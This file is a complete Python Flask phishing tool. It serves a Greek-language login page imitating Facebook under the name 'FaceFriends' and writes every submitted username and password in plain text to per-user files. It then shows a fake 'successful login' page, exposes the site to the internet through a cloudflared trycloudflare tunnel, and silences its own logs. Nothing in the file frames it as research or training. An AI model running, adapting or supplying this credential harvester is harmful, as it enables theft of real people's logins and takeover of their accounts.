import os
import sys
import subprocess
import re
import threading
import time
import logging
from flask import Flask, render_template_string, request, redirect, url_for
from datetime import datetime
from werkzeug.utils import secure_filename

# Auto-install missing packages quietly
def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

# Flask app setup
app = Flask(__name__)

# Suppress Flask and Werkzeug logs completely
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)  # effectively silence
app.logger.setLevel(logging.ERROR + 10)

# Also silence Flask's startup messages by redirecting output temporarily
class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

# Data saving folder
BASE_FOLDER = os.path.expanduser("~/storage/downloads/FaceFriends")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>FaceFriends - Συνδεθείτε & Μοιραστείτε</title>
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
        <style>
            :root {
                /* Light theme colors (Facebook-like) */
                --bg-light: #f0f2f5; /* Light gray background */
                --text-light: #1c1e21; /* Dark text */
                --container-bg-light: #ffffff;
                --border-light: #dddfe2;
                --input-bg-light: #ffffff;
                --input-border-light: #dddfe2;
                --button-bg-light: #1877f2; /* Facebook blue */
                --button-hover-light: #166fe5; /* Darker blue on hover */
                --link-light: #1877f2;
                --signup-button-bg-light: #42b72a; /* Facebook green for signup */
                --signup-button-hover-light: #36a420;
            }

            @media (prefers-color-scheme: dark) {
                :root {
                    /* Dark theme colors */
                    --bg-light: #1a1a1a;
                    --text-light: #e4e6eb;
                    --container-bg-light: #242526;
                    --border-light: #3e4042;
                    --input-bg-light: #3a3b3c;
                    --input-border-light: #555555;
                    --button-bg-light: #2d88ff;
                    --button-hover-light: #1d72eb;
                    --link-light: #52a8ff;
                    --signup-button-bg-light: #42b72a;
                    --signup-button-hover-light: #36a420;
                }
            }

            /* General Body Styles */
            body {
                font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
                background-color: var(--bg-light);
                color: var(--text-light);
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                padding: 20px;
                box-sizing: border-box;
                transition: background-color 0.3s, color 0.3s;
            }

            /* Main container for the form elements */
            .container {
                display: flex;
                flex-direction: column;
                align-items: center;
                width: 100%;
                max-width: 350px;
                text-align: center;
            }

            /* Styling for the main login box */
            .login-box {
                background-color: var(--container-bg-light);
                border: 1px solid var(--border-light);
                width: 100%;
                padding: 20px 25px;
                margin-bottom: 10px;
                box-sizing: border-box;
                border-radius: 8px;
                box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
                transition: background-color 0.3s, border-color 0.3s, box-shadow 0.3s;
            }

            /* Logo/Title */
            .logo-title {
                font-family: 'Roboto', sans-serif;
                font-size: 2.8em;
                color: var(--button-bg-light);
                font-weight: 700;
                margin-bottom: 25px;
                transition: color 0.3s;
            }

            /* Input fields for username and password */
            .input-field input {
                width: 100%;
                padding: 14px 16px;
                margin-bottom: 15px;
                border: 1px solid var(--input-border-light);
                border-radius: 6px;
                background-color: var(--input-bg-light);
                font-size: 17px;
                box-sizing: border-box;
                color: var(--text-light);
                transition: background-color 0.3s, border-color 0.3s, color 0.3s;
            }
            .input-field input::placeholder {
                color: #8a8d91;
                opacity: 0.8;
            }
            .input-field input:focus {
                border-color: var(--button-bg-light);
                outline: none;
            }

            /* Login button */
            .login-button {
                width: 100%;
                padding: 14px 16px;
                border: none;
                border-radius: 6px;
                background-color: var(--button-bg-light);
                color: white;
                font-weight: 700;
                font-size: 17px;
                cursor: pointer;
                margin-bottom: 16px;
                transition: background-color 0.2s ease;
            }
            .login-button:hover {
                background-color: var(--button-hover-light);
            }
            
            /* Forgot password link */
            .forgot-password {
                display: block;
                color: var(--link-light);
                font-size: 14px;
                text-decoration: none;
                margin-bottom: 16px;
                transition: color 0.3s;
            }
            .forgot-password:hover {
                text-decoration: underline;
            }

            /* Divider line */
            .divider {
                display: flex;
                align-items: center;
                margin: 20px 0;
            }
            .line {
                flex-grow: 1;
                height: 1px;
                background-color: var(--border-light);
                transition: background-color 0.3s;
            }
            .or {
                margin: 0 15px;
                font-size: 13px;
                color: #606770;
                font-weight: 600;
            }

            /* Create New Account Button */
            .create-account-button {
                display: inline-block;
                padding: 14px 18px;
                border: none;
                border-radius: 6px;
                background-color: var(--signup-button-bg-light);
                color: white;
                font-weight: 700;
                font-size: 17px;
                text-decoration: none;
                cursor: pointer;
                transition: background-color 0.2s ease;
            }
            .create-account-button:hover {
                background-color: var(--signup-button-hover-light);
            }

            /* Footer links */
            .language-options, .meta-links {
                width: 100%;
                max-width: 350px;
                margin-top: 20px;
                text-align: center;
                font-size: 12px;
                color: #606770;
            }
            .language-options a, .meta-links a {
                color: #606770;
                text-decoration: none;
                margin: 0 5px;
            }
            .language-options a:hover, .meta-links a:hover {
                text-decoration: underline;
            }
            .language-options span {
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo-title">FaceFriends</div>
            <div class="login-box">
                <form action="/login" method="post">
                    <div class="input-field">
                        <input type="text" name="username" placeholder="Email ή αριθμός τηλεφώνου" required>
                    </div>
                    <div class="input-field">
                        <input type="password" name="password" placeholder="Κωδικός πρόσβασης" required>
                    </div>
                    <button type="submit" class="login-button">Σύνδεση</button>
                </form>
                <a href="#" class="forgot-password">Ξεχάσατε τον κωδικό πρόσβασης;</a>
                <div class="divider">
                    <div class="line"></div>
                    <div class="or">ή</div>
                    <div class="line"></div>
                </div>
                <a href="#" class="create-account-button">Δημιουργία νέου λογαριασμού</a>
            </div>
            <div class="language-options">
                <a href="#">English (US)</a> <a href="#">Ελληνικά</a> <a href="#">Deutsch</a> <a href="#">Español</a> <a href="#">Français</a>
                </div>
            <div class="meta-links">
                <a href="#">Σχετικά</a> <a href="#">Βοήθεια</a> <a href="#">Περισσότερα</a>
                <div>FaceFriends © 2025</div>
            </div>
        </div>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()

    if not username or not password:
        return "Email/Αριθμός τηλεφώνου και κωδικός πρόσβασης απαιτούνται!", 400

    safe_username = secure_filename(username)
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Όνομα χρήστη: {username}\n")
        file.write(f"Κωδικός πρόσβασης: {password}\n")
        file.write(f"Χρονική σήμανση: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <meta name="color-scheme" content="light dark" />
      <title>Επιτυχής Σύνδεση!</title>
      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet" />
      <style>
        :root {
          --primary-success: #28a745;
          --bg-light: #f0f2f5;
          --text-light: #1c1e21;
          --container-bg-light: #ffffff;
          --shadow-light: rgba(0,0,0,0.1);
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --primary-success: #28a745;
            --bg-light: #1a1a1a;
            --text-light: #e4e6eb;
            --container-bg-light: #242526;
            --shadow-light: rgba(0,0,0,0.3);
          }
        }
        body {
          font-family: 'Roboto', sans-serif;
          margin:0; padding:20px;
          display:flex; justify-content:center;
          min-height: 100vh;
          align-items: center;
          background-color: var(--bg-light);
          color: var(--text-light);
          transition: background-color 0.3s, color 0.3s;
        }
        .container {
          padding: 40px;
          max-width: 600px;
          width: 100%;
          border-radius: 8px;
          box-sizing: border-box;
          text-align: center;
          background: var(--container-bg-light);
          border-left: 4px solid var(--primary-success);
          box-shadow: 0 4px 20px var(--shadow-light);
          transition: background-color 0.3s, border-color 0.3s, box-shadow 0.3s;
        }
        h2 {
          margin-top: 0;
          font-weight: 700;
          font-size: 1.8em;
          margin-bottom: 10px;
          color: var(--primary-success);
          transition: color 0.3s;
        }
        p {
          font-size: 1.1em;
          margin-top: 20px;
          line-height: 1.4;
        }
      </style>
      <meta http-equiv="refresh" content="3; url=/" />
    </head>
    <body>
      <div class="container">
        <h2>Επιτυχής Σύνδεση!</h2>
        <p>Η προσπάθεια σύνδεσής σας ήταν επιτυχής.<br>Θα ανακατευθυνθείτε σε λίγο.</p>
      </div>
    </body>
    </html>
    '''
    )

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--protocol", "http2", "--url", local_url]

    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    tunnel_url = None
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"Δημόσια Σύνδεση FaceFriends: {tunnel_url}")
            sys.stdout.flush()
            break
    return process

if __name__ == '__main__':
    # Suppress Flask startup messages by redirecting stdout/stderr temporarily
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    # Run flask app in a separate thread so we can run cloudflared tunnel simultaneously
    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Restore stdout/stderr after server starts
    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5000")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        sys.exit(0)